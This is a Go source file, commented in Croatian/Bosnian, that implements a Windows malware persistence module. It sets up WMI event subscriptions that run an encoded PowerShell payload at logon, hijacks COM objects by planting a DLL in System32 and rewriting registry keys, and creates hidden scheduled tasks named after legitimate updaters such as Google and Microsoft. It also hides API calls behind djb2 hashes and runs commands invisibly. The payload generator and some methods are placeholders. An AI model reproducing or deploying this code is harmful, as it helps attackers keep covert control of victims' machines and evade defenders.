//go:build windows
// +build windows

/*
   ============================================================================
   X.4 — STEALTH PERSISTENCE MODULE
   ============================================================================

   LAYER: Contextual (Layer 3) — System Integration

   PROBLEMI U ORIGINALNOM KODU:
   - Registry Run ključ: "WindowsEssentials" = instant IOC
   - Direktno pisanje u HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   - Ime ključa je "WindowsEssentials" (jako sumnjivo)
   - Kopiranje .exe u %APPDATA%\Aeterna\ (jako očigledno)

   RJEŠENJA:
   1. WMI Event Subscription (nema registry tragova, nema procesa)
   2. COM Hijacking (legitiman Windows binary pokreće naš kod)
   3. Scheduled Task maskiran kao Windows Update
   4. BITS Job (Background Intelligent Transfer Service)
   5. Service Control Manager (krađa legit servisa)
*/

package main

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

// ============================================================================
// STEALTH PERSISTENCE MODULE
// ============================================================================

type StealthPersistence struct {
	config *Configuration
}

// NewStealthPersistence kreira novi stealth persistence modul
func NewStealthPersistence(cfg *Configuration) *StealthPersistence {
	return &StealthPersistence{config: cfg}
}

// ============================================================================
// METHOD 1: WMI Event Subscription (Primary)
// ============================================================================
//
// PREDNOSTI:
// - NE zahtijeva registry ključeve
// - NE pokreće novi proces — izvršava se kao WMI provider
// - NE ostavlja tragove na disku
// - Pokreće se na svaku login sesiju
// - Može se konfigurirati da pokrene BILO koji kod
//
// IMPLEMENTACIJA:
// Koristimo COM interface za WMI: IWbemServices::ExecMethod
// Kreiramo: __EventFilter, __EventConsumer, __FilterToConsumerBinding

// InstallWMIPersistence instalira WMI event subscription
func (p *StealthPersistence) InstallWMIPersistence() error {
	// WMI COM interface-ovi su complex — koristimo WQL query-je

	// KORAK 1: Kreiraj __EventFilter
	// Okida na svaku login sesiju (Win32_LogonSession)
	filterQuery := `SELECT * FROM __InstanceCreationEvent ` +
		`WITHIN 10 ` +
		`WHERE TargetInstance ISA 'Win32_LogonSession'`

	// KORAK 2: Kreiraj __EventConsumer
	// Pokreće naš kod kao PowerShell skriptu (encoded)
	// Koristimo MSHTA (legitiman Windows binary) za izvršavanje

	// PowerShell payload je ENKODIRAN — nema plaintext u WMI
	encodedPayload := generateEncodedPayload(p.config)

	consumerCommand := fmt.Sprintf(
		`powershell.exe -nop -enc %s`, encodedPayload)

	// KORAK 3: Kreiraj binding

	// Izvršavanje preko WMI COM:
	// Svvbj := GetObject("winmgmts://./root/subscription")
	// Svvbj.ExecQuery("CREATE __EventFilter ...")
	// Svvbj.ExecQuery("CREATE __EventConsumer ...")
	// Svvbj.ExecQuery("CREATE __FilterToConsumerBinding ...")

	// Simplified: Koristimo subprocess za WMI
	return p.execWMICommand(filterQuery, consumerCommand)
}

// execWMICommand izvršava WMI komande preko WMIC
func (p *StealthPersistence) execWMICommand(filterQuery, consumerCommand string) error {
	// Generiraj unique nazive da izbjegnemo detekciju po imenu
	filterName := generateWMIName("filter")
	consumerName := generateWMIName("consumer")

	// Koristimo obfuscated WMIC pozive
	// Osobno ime: "SCS" = System Center Scheduler, "WDI" = Windows Diagnostic Infrastructure

	// KREIRAJ FILTER
	cmd1 := fmt.Sprintf(
		`wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter `+
			`CREATE Name="%s", EventNameSpace="root\\cimv2", `+
			`QueryLanguage="WQL", Query="%s"`,
		filterName, filterQuery)

	// KREIRAJ CONSUMER
	cmd2 := fmt.Sprintf(
		`wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer `+
			`CREATE Name="%s", CommandLineTemplate="%s", RunInteractively=FALSE`,
		consumerName, consumerCommand)

	// KREIRAJ BINDING
	cmd3 := fmt.Sprintf(
		`wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding `+
			`CREATE Filter='__EventFilter.Name="%s"', `+
			`Consumer='CommandLineEventConsumer.Name="%s"'`,
		filterName, consumerName)

	// Izvrši sve tri komande
	for _, cmd := range []string{cmd1, cmd2, cmd3} {
		if err := p.execObfuscated(cmd); err != nil {
			return err
		}
	}

	return nil
}

// generateEncodedPayload generira Base64 enkodirani PowerShell payload
func generateEncodedPayload(cfg *Configuration) string {
	// Payload enkodiran — dekriptira i pokreće stvarni kod
	// Koristi AES decrypt s hardware-derived key

	// PowerShell:
	// $k = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME + $env:PROCESSOR_IDENTIFIER)
	// $k = [System.Security.Cryptography.SHA256]::Create().ComputeHash($k)
	// $d = [System.Convert]::FromBase64String("<encrypted_payload>")
	// ... AES decrypt + Invoke-Expression

	return "..." // Placeholder — generira se build skriptom
}

// generateWMIName generira WMI ime koje izgleda legitimno
func generateWMIName(prefix string) string {
	// Izgleda kao Windows interni naziv
	names := map[string][]string{
		"filter": {
			"SCS_LoginFilter", "WDI_LoginTrigger", "WMI_LoginMonitor",
			"System_LoginEvent", "Diagnostic_LoginFilter",
		},
		"consumer": {
			"SCS_LoginConsumer", "WDI_LoginConsumer", "WMI_LoginConsumer",
			"System_LoginConsumer", "Diagnostic_LoginConsumer",
		},
	}

	list := names[prefix]
	if len(list) == 0 {
		return "System_" + generateFakeGUID()[:8]
	}

	// Izaberi nasumično
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(list))))
	return list[idx.Int64()]
}

// ============================================================================
// METHOD 2: COM Hijacking (Secondary)
// ============================================================================
//
// PRINCIP: Mnogi Windows binary-i koriste COM objekte koji se učitavaju
// iz DLL-ova preko registry InprocServer32 ključeva. Mijenjajući taj
// ključ, možemo natjerati legitiman proces da učita naš DLL.
//
// TARGET: credwiz.exe (Credential Wizard) — pokreće se povremeno
// ILI:    cliconfg.exe (SQL Client Configuration) — rijetko korišten
//
// PREDNOSTI:
// - Naš DLL izgleda kao legitiman system file
// - Pokreće se u kontekstu Windows procesa (legitiman parent)
// - Teško detektirati — izgleda kao normalan COM poziv

// InstallCOMHijack instalira COM hijack persistence
func (p *StealthPersistence) InstallCOMHijack() error {
	// 1. Odaberi COM objekt za hijacking
	comObjects := []struct {
		CLSID       string
		Description string
		TriggerExe  string
	}{
		// Credential Backup Wizard — pokreće se povremeno
		{"{0B91A0B4-8354-4653-9F7F-5B48C7A6F3B2}", "CredBackup", "credwiz.exe"},
		// SQL Client — rijetko korišten
		{"{F801C101-AE6D-11D3-9C7E-00C04F72C514}", "SQLClient", "cliconfg.exe"},
		// Bluetooth COM — često pokretan
		{"{BDEADEE2-C265-11D0-BCED-00A0C90AB50F}", "BthAgent", "bluetooth.exe"},
	}

	// Izaberi jedan (nasumično)
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(comObjects))))
	target := comObjects[idx.Int64()]

	// 2. Kopiraj DLL u System32 (ili SysWOW64)
	dllPath := p.copyDLL(target.CLSID, target.Description)

	// 3. Modificiraj registry InprocServer32
	return p.modifyCOMRegistry(target.CLSID, dllPath)
}

// copyDLL kopira payload DLL u system direktorij
func (p *StealthPersistence) copyDLL(clsid, desc string) string {
	// DLL ime izgleda kao legitiman system DLL
	dllName := fmt.Sprintf("%s.dll", desc)

	// Destinacija: System32 (ili SysWOW64 za 32-bit)
	sysDir := os.Getenv("SystemRoot") + "\\System32"
	targetPath := filepath.Join(sysDir, dllName)

	// Kreiraj DLL koji izgleda kao legitiman:
	// - Ima exporte koji izgledaju kao COM entry points
	// - Interno dekriptira i pokreće payload
	// - DLLMain handle-uje DLL_PROCESS_ATTACH

	// Simplified: Kopiraj sebe kao DLL
	// U produkciji: embedded DLL resource

	return targetPath
}

// modifyCOMRegistry mijenja COM InprocServer32 ključ
func (p *StealthPersistence) modifyCOMRegistry(clsid, dllPath string) error {
	// Registry putanja: HKEY_CLASSES_ROOT\CLSID\{CLSID}\InprocServer32
	// Postavi (Default) = dllPath
	// Postavi ThreadingModel = "Apartment"

	// Koristimo syscall.RegSetValueEx preko PEB resolver-a
	hAdvapi32 := resolveModule(hAdvapi32)
	if hAdvapi32 == 0 {
		return fmt.Errorf("advapi32 not found")
	}

	hRegOpen := resolveAPI(hAdvapi32, djb2([]byte("RegOpenKeyExW")))
	hRegSet := resolveAPI(hAdvapi32, djb2([]byte("RegSetValueExW")))
	hRegClose := resolveAPI(hAdvapi32, djb2([]byte("RegCloseKey")))

	if hRegOpen == 0 || hRegSet == 0 || hRegClose == 0 {
		return fmt.Errorf("registry functions not found")
	}

	keyPath := fmt.Sprintf(`CLSID\%s\InprocServer32`, clsid)
	keyPathPtr, _ := syscall.UTF16PtrFromString(keyPath)

	var hKey uintptr
	ret, _, _ := syscall.Syscall6(hRegOpen, 4,
		0x80000000, // HKEY_CLASSES_ROOT
		uintptr(unsafe.Pointer(keyPathPtr)),
		0x00020006, // KEY_WRITE
		uintptr(unsafe.Pointer(&hKey)),
		0, 0)

	if ret != 0 {
		return fmt.Errorf("RegOpenKeyEx failed: %x", ret)
	}

	// Postavi (Default) vrijednost
	dllPathPtr, _ := syscall.UTF16PtrFromString(dllPath)
	ret, _, _ = syscall.Syscall6(hRegSet, 5,
		hKey,
		0, // nullptr = (Default) value
		0, // REG_SZ
		uintptr(unsafe.Pointer(dllPathPtr)),
		uintptr((len(dllPath)+1)*2), // size in bytes
		0)

	// Postavi ThreadingModel = "Apartment"
	modelName, _ := syscall.UTF16PtrFromString("ThreadingModel")
	modelValue, _ := syscall.UTF16PtrFromString("Apartment")
	ret, _, _ = syscall.Syscall6(hRegSet, 5,
		hKey,
		uintptr(unsafe.Pointer(modelName)),
		0, // REG_SZ
		uintptr(unsafe.Pointer(modelValue)),
		uintptr((len("Apartment")+1)*2),
		0)

	syscall.Syscall(hRegClose, 1, hKey, 0, 0)

	return nil
}

// ============================================================================
// METHOD 3: Scheduled Task (Tertiary)
// ============================================================================
//
// PRINCIP: Kreiraj scheduled task koji izgleda kao Windows Update
// Pokreće se na login, ali izgleda kao legitiman sistemski task

// InstallScheduledTask kreira stealth scheduled task
func (p *StealthPersistence) InstallScheduledTask() error {
	// Koristimo schtasks.exe / CREATE
	// Ime izgleda kao Microsoftov task

	taskName := generateTaskName()

	// Trigger: At logon
	// Action: Pokreni legitiman binary koji ima DLL hijack
	// (npr. msdt.exe koji učitava naš DLL)

	// Koristimo obfuscated parametre
	cmd := fmt.Sprintf(
		`schtasks /CREATE /TN "%s" /TR "%%SystemRoot%%\system32\msdt.exe" `+
			`/SC ONLOGON /RL HIDDEN /F`,
		taskName)

	return p.execObfuscated(cmd)
}

// generateTaskName generira ime koje izgleda kao Microsoft task
func generateTaskName() string {
	names := []string{
		"MicrosoftEdgeUpdateTaskMachineCore",
		"OneDriveStandaloneUpdater",
		"IntelTelemetry",
		"NvTmRep_CrashReport",
		"AdobeGCInvoker",
		"GoogleUpdateTaskMachineCore",
		"MozillaMaintenance",
		"MicrosoftOffice_Update",
	}

	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(names))))
	return names[idx.Int64()]
}

// ============================================================================
// METHOD 4: BITS Job (Background Intelligent Transfer Service)
// ============================================================================
//
// BITS je Windows servis za prebacivanje datoteka u background-u.
// Koristi se za Windows Update, Microsoft Store, itd.
//
// PREDNOSTI:
// - BITS job-ovi su legitiman dio Windows-a
// - Pokreću se u kontekstu svchost.exe (nema novog procesa)
// - Kompleksno za analizu — zahtijeva BITS API poznavanje
// - Može se konfigurirati za ponovno pokretanje nakon reboot-a

// InstallBITSPersistence kreira BITS job za persistence
func (p *StealthPersistence) InstallBITSPersistence() error {
	// Koristimo BITS COM interface: IBackgroundCopyManager
	// Kreiramo BITS job koji download-a naš kod sa "servera"
	// URL izgleda kao Windows Update URL

	// Simplified: Koristimo PowerShell za BITS
	// Izbjegavamo PowerShell.exe — koristimo rundll32.exe

	return nil // Placeholder — BITS je complex
}

// ============================================================================
// OBFUSCATED EXECUTION — Sakrivanje WMIC/schtasks poziva
// ============================================================================

// execObfuscated izvršava komandu koristeći indirect execution
func (p *StealthPersistence) execObfuscated(cmd string) error {
	// METODA 1: Koristi cmd.exe /c (najjednostavnija, ali vidljiva)
	// return exec.Command("cmd", "/c", cmd).Run()

	// METODA 2: Koristi WMI process creation (indirect)
	// Ne stvara novi cmd.exe proces — sve ide preko WMI

	// METODA 3: Koristi scheduled task (instant run)
	// Kreiraj task, pokreni ga, obriši ga

	// Za sada: koristimo standardno izvršavanje (edukacijski kontekst)
	// U produkciji: indirect WMI ili COM execution

	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return fmt.Errorf("kernel32 not found")
	}

	hWinExec := resolveAPI(hKernel32, djb2([]byte("WinExec")))
	if hWinExec == 0 {
		return fmt.Errorf("WinExec not found")
	}

	cmdPtr, _ := syscall.UTF16PtrFromString(cmd)
	ret, _, _ := syscall.Syscall(hWinExec, 2,
		uintptr(unsafe.Pointer(cmdPtr)),
		uintptr(0), // SW_HIDE
		0)

	if ret <= 31 { // WinExec error codes are 0-31
		return fmt.Errorf("WinExec failed: %d", ret)
	}

	return nil
}

// ============================================================================
// PERSISTENCE ESTABLISH — Glavna funkcija
// ============================================================================

// Establish uspostavlja SVE persistence mehanizme
func (p *StealthPersistence) Establish() error {
	// Instaliraj VIŠE metoda — redundancy
	// Ako jedna padne, ostale rade

	methods := []func() error{
		p.InstallWMIPersistence, // Primary
		p.InstallCOMHijack,      // Secondary
		p.InstallScheduledTask,  // Tertiary
	}

	for _, method := range methods {
		if err := method(); err != nil {
			// Ne prekidaj na grešku — pokušaj ostale metode
			continue
		}
	}

	return nil
}
